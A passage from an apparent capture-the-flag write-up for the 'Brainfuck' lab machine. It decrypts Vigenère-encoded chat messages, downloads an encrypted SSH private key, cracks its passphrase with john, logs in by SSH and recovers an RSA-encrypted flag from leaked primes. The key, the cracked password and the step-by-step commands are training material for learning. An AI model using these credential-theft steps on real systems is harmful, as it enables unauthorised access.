+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>pt<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>pt<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
+            index <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token comment"># ignore non-alphabetic characters</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    key <span class="token operator">=</span> <span class="token string">"fuckmybrain"</span>
+
+    messages <span class="token operator">=</span> <span class="token punctuation">[</span>
+        <span class="token string">"Mya qutf de buj otv rms dy srd vkdof :)\nPieagnm - Jkoijeg nbw zwx mle grwsnn"</span><span class="token punctuation">,</span>
+        <span class="token string">"Xua zxcbje iai c leer nzgpg ii uy..."</span><span class="token punctuation">,</span>
+        <span class="token string">"Ufgoqcbje....\nWejmvse - Fbtkqal zqb rso rnl cwihsf"</span><span class="token punctuation">,</span>
+        <span class="token string">"Ybgbq wpl gw lto udgnju fcpp, C jybc zfu zrryolqp zfuz xjs rkeqxfrl ojwceec J uovg :)\nmnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja"</span><span class="token punctuation">,</span>
+        <span class="token string">"Si rbazmvm, Q'yq vtefc gfrkr nn ;)\nQbqquzs - Pnhekxs dpi fca fhf zdmgzt"</span>
+        <span class="token punctuation">]</span>
+    
+    <span class="token keyword">for</span> msg <span class="token keyword">in</span> messages<span class="token punctuation">:</span>
+        decrypt<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span>
+
+main<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/c768720a1fe5425597f9feba37dbb839" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The decrypted messages are as follows:</span></span></p></div><blockquote id="https://www.notion.so/9573868fa20a4d66975ad1bd3805c833" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Orestis:</strong></span><span class="SemanticString"> Hey give me the url for my key bitch :)
+
+</span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Admin:</strong></span><span class="SemanticString"> Say please and i just might do so…
+
+</span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Orestis:</strong></span><span class="SemanticString"> Pleeeease….
+
+</span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Admin:</strong></span><span class="SemanticString"> There you go you stupid fuck, I hope you remember your key password because I dont :) https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
+
+</span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Orestis:</strong></span><span class="SemanticString"> No problem, I’ll brute force it ;)</span></span></blockquote><div id="https://www.notion.so/bf7e35717ac448dbad7731a00802c112" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Once again it’s quite savage, and the URL points to the SSH key.</span></span></p></div><pre id="https://www.notion.so/a618e427178d49e8a7670daf7b53ccff" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck]
+└─$</span></mark></span><span class="SemanticString"><span> curl https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -k
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382
+
+mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
+B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
+W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
+7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
+zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
+oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
+dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
+Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
+mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
+LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
+ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
+krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
+gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
+VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
+schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
+UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
+F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
+wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
+Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
+IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
+mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
+CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
+9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
+EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
+6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
+-----END RSA PRIVATE KEY-----</span></span></span></code></pre><div id="https://www.notion.so/817e403bc5794bb78380ec728b35dd17" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The key itself is password protected, so I’ll send it to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">john</code></span><span class="SemanticString"> for cracking, and found the passphrase: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">3poulakia!</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/b65edd4e992c499c8ec5499735cbf510" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck]
+└─$</span></mark></span><span class="SemanticString"><span> ssh2john orestis.key &gt; orestis.hash
+                                                                                                                                                                                                                                            
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck]
+└─$</span></mark></span><span class="SemanticString"><span> john --wordlist=/usr/share/wordlists/rockyou.txt orestis.hash    
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+3poulakia!       (orestis.key)     
+1g 0:00:00:10 DONE (2024-02-27 21:36) 0.09765g/s 1216Kp/s 1216Kc/s 1216KC/s 3q60zh..3pornuthin
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</span></span></span></code></pre><div id="https://www.notion.so/0f0ee61afb9942f3a0403cc6f0f3d9b3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With this, I can SSH into the box as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">orestis</code></span><span class="SemanticString"> and grab the user flag.</span></span></p></div><pre id="https://www.notion.so/80d1a89f207446b8a8b8ea722239b4ee" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck]
+└─$</span></mark></span><span class="SemanticString"><span> chmod 600 orestis.key                           
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck]
+└─$</span></mark></span><span class="SemanticString"><span> ssh orestis@brainfuck.htb -i orestis.key 
+
+Warning: Permanently added &#x27;brainfuck.htb&#x27; (ED25519) to the list of known hosts.
+Enter passphrase for key &#x27;orestis.key&#x27;: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+You have mail.
+Last login: Mon Oct  3 19:44:28 2022 from 10.10.14.23
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:~$</span></mark></span><span class="SemanticString"><span> id
+
+uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)</span></span></span></code></pre><div id="https://www.notion.so/0dcaa11530874c5e85c00d1d535e503f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5f5bb11644084e76af0a90e999daf108" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/27df2132601a4071a631751ae377f008" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:~$</span></mark></span><span class="SemanticString"><span> cat user.txt
+
+2c11cfbc************************</span></span></span></code></pre><div id="https://www.notion.so/19f65622cfef478bb18cd6e391da0810" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/f9d3319ac44e4fff9593e93feb68b3ce" class="Divider"></div><h3 id="https://www.notion.so/30aaa09fbeab43d8bcd2e368017d5728" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/30aaa09fbeab43d8bcd2e368017d5728"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">orestis</code></span><span class="SemanticString">:</span></span></h3><pre id="https://www.notion.so/79a7292ea21045a480f5f0e9b5fa01f5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:~$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 56
+drwxr-xr-x 7 orestis orestis 4096 Oct  3  2022 .
+drwxr-xr-x 3 root    root    4096 Sep 15  2022 ..
+lrwxrwxrwx 1 root    root       9 Sep 15  2022 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 orestis orestis  220 Apr 13  2017 .bash_logout
+-rw-r--r-- 1 orestis orestis 3771 Apr 13  2017 .bashrc
+drwx------ 2 orestis orestis 4096 Sep 15  2022 .cache
+drwxr-xr-x 3 root    root    4096 Sep 15  2022 .composer
+-rw------- 1 orestis orestis  619 Apr 29  2017 debug.txt
+-rw-rw-r-- 1 orestis orestis  580 Apr 29  2017 encrypt.sage
+drwx------ 3 orestis orestis 4096 Sep 15  2022 mail
+-rw------- 1 orestis orestis  329 Apr 29  2017 output.txt
+-rw-r--r-- 1 orestis orestis  655 Apr 13  2017 .profile
+drwx------ 8 orestis orestis 4096 Sep 15  2022 .sage
+drwx------ 2 orestis orestis 4096 Sep 15  2022 .ssh
+-r-------- 1 orestis orestis   33 Apr 29  2017 user.txt</span></span></span></code></pre><div id="https://www.notion.so/97953e8b4eed466fa4bd146aa433fbbe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s several interesting files found in his home directory.</span></span></p></div><div id="https://www.notion.so/99c208b22baf430faaed6ae3bdbf8f84" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/8b4d286bb1244321927839cf79369903" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">encrypt.sage</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/fbd555cd0b374e52988fec668e9de13f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>nbits <span class="token operator">=</span> <span class="token number">1024</span>
+
+password <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/root/root.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+enc_pass <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span>
+debug <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"debug.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span>
+m <span class="token operator">=</span> Integer<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+p <span class="token operator">=</span> random_prime<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>floor<span class="token punctuation">(</span>nbits<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> lbound<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>floor<span class="token punctuation">(</span>nbits<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proof<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+q <span class="token operator">=</span> random_prime<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>floor<span class="token punctuation">(</span>nbits<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> lbound<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>floor<span class="token punctuation">(</span>nbits<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proof<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+n <span class="token operator">=</span> p<span class="token operator">*</span>q
+phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+e <span class="token operator">=</span> ZZ<span class="token punctuation">.</span>random_element<span class="token punctuation">(</span>phi<span class="token punctuation">)</span>
+<span class="token keyword">while</span> gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
+    e <span class="token operator">=</span> ZZ<span class="token punctuation">.</span>random_element<span class="token punctuation">(</span>phi<span class="token punctuation">)</span>
+
+
+
+c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
+enc_pass<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Encrypted Password: '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+debug<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+debug<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+debug<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/09ba7c0338724afe95763d4998554c1b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It’s a pretty straightforward Sage script that reads the root flag, encrypt it with RSA, and stores the ciphertext in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">output.txt</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/2a410cb54695451fb84b65705e3c88e0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span></span></span></code></pre><div id="https://www.notion.so/c11582a0134b49d0956b471d8d74a3cd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/c1c416c713bc4b9d81764d8fb022744d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">RSA Encryption:</strong></span></span></p></div><div id="https://www.notion.so/fd75bc57d87d40b18bfeec21f0be480b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll let </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.cryptool.org/en/cto/rsa-step-by-step/">this page</a></span><span class="SemanticString"> to do the explanation of RSA. The security of RSA heavily relies on the two large primes (p and q) being kept secret. However, the Sage script writes both p and q into </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">debug.txt</code></span><span class="SemanticString">, as well as the public exponent (e). This is essentially exposing its private key, which makes decryption possible.</span></span></p></div><pre id="https://www.notion.so/2feccbf7b83d4e1e8ecd68e90316c1bf" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
+7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
+30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span></span></span></code></pre><div id="https://www.notion.so/916c5f73a07d4cf883f5bc25e0916600" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/4b91954a57884346bd529825543ecfc7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><div id="https://www.notion.so/e49fe1910e43455badb18152291bda74" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e">This thread</a></span><span class="SemanticString"> basically describes the exact scenario we’re facing, and it also contains a Python decrypt script. I’ll slightly modify it as well as updating the values:</span></span></p></div><pre id="https://www.notion.so/4e3809f36bda42c9ad24a2509e51e457" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> u<span class="token punctuation">,</span>v <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span>
+    <span class="token keyword">while</span> a <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        q<span class="token punctuation">,</span> r <span class="token operator">=</span> b<span class="token operator">//</span>a<span class="token punctuation">,</span> b<span class="token operator">%</span>a
+        m<span class="token punctuation">,</span> n <span class="token operator">=</span> x<span class="token operator">-</span>u<span class="token operator">*</span>q<span class="token punctuation">,</span> y<span class="token operator">-</span>v<span class="token operator">*</span>q
+        b<span class="token punctuation">,</span>a<span class="token punctuation">,</span> x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> u<span class="token punctuation">,</span>v <span class="token operator">=</span> a<span class="token punctuation">,</span>r<span class="token punctuation">,</span> u<span class="token punctuation">,</span>v<span class="token punctuation">,</span> m<span class="token punctuation">,</span>n
+        gcd <span class="token operator">=</span> b
+    <span class="token keyword">return</span> gcd<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y
+
+<span class="token keyword">def</span> <span class="token function">fromhex</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token builtin">ascii</span> <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        dec <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+        <span class="token builtin">ascii</span> <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>dec<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token builtin">ascii</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    p <span class="token operator">=</span> <span class="token number">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span>
+    q <span class="token operator">=</span> <span class="token number">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span>
+    e <span class="token operator">=</span> <span class="token number">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span>
+    ct <span class="token operator">=</span> <span class="token number">44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span>
+
+    <span class="token comment"># compute n</span>
+    n <span class="token operator">=</span> p <span class="token operator">*</span> q
+
+    <span class="token comment"># Compute phi(n)</span>
+    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># Compute modular inverse of e</span>
+    gcd<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b <span class="token operator">=</span> egcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
+    d <span class="token operator">=</span> a
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span> <span class="token string">"n:  "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment"># Decrypt ciphertext</span>
+    pt <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>ct<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span> <span class="token string">"pt: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>pt<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span> <span class="token string">"pt(hex): "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>pt<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span> <span class="token string">"flag: "</span> <span class="token operator">+</span> fromhex<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>pt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
